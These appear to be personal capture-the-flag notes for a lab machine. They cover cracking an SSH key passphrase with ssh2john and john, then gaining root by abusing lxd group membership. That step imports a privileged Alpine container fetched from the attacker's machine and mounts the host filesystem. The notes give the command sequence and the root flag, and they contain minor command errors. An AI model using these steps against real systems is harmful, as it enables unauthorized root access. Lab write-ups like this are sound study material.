22 OpenSSH 7.6p1  
80 Apache httpd 2.4.29 ((Ubuntu))
 
/uploads  
/secret - ssh key
 
try to ssh as john from main page source code, need passphrase  
ssh2john id_rsa > john.txt  
john --wordlist=rockyou.txt john.txt  
ssh -I id_rsa john@IP  
passphrase: letmein
 
id  
see that john is in lxd group  
google lxd privesc  
(it’s a whole ass process)
 
On your own machine run lxd-alpine-builder to make a small alpine linux container  
git clone https://github.com/saghul/lxd-alpine-builder.git  
CD into the clone directory and run the build-alpine file, which will generate a tar.gz file that contains the alpine linux container.  
The start a http server, and transfer the alpine linux container from your machine to the target machine  
python -m SimpleHTTPServer 5000 (your machine)  
wget yourip:5000/alpinecontainer.tar.gz  
Now that we have the alpine linux container on the target, we need to import it into lxc  
lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias myimage  
Then we'll give the container privileges and add the root directory as a mount point, and start the container  
lxc init myimage ignite -c security.privileged=true  
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true  
lxc start ignite  
lxc exec ignite /bin/sh  
From here if we cd into /mnt/root we can get the root flag
 
/mnt/root/root/root.txt  
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
 
LL:  
ssh2john practice  
exploiting lxd group for root shell  
lxd is linux container manager; when lxd is installed, it automatically gives everyone root privs of container. We mount the root dir to our local machine and then somehow get the flag